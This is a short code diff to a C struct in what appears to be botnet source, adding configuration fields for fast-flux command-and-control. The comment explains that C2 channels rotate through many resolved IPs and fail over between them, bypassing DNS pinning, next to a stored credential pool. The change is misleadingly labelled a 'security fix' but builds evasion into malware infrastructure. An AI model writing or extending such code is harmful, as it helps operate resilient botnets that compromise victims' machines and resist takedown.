@@ -109,6 +109,15 @@ typedef struct {
     int peer_count;
     time_t peer_cache_time;  /* last successful peer DNS resolution time */
     
+    /* SECURITY FIX (#85): Fast-flux C2. When enabled, all three C2
+     * channels resolve every A record of their hostname into a rotating
+     * cache (see src/protocol.c), rotate the active IP every flux_ttl
+     * seconds, and fail over to the next IP on connect/recv timeout.
+     * DNS pinning (#10) is bypassed in flux mode by design — the peer
+     * IP is expected to change. Disabled by default (single resolution). */
+    uint8_t flux_enabled;
+    uint32_t flux_ttl;   /* seconds between re-resolution + rotation */
+    
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
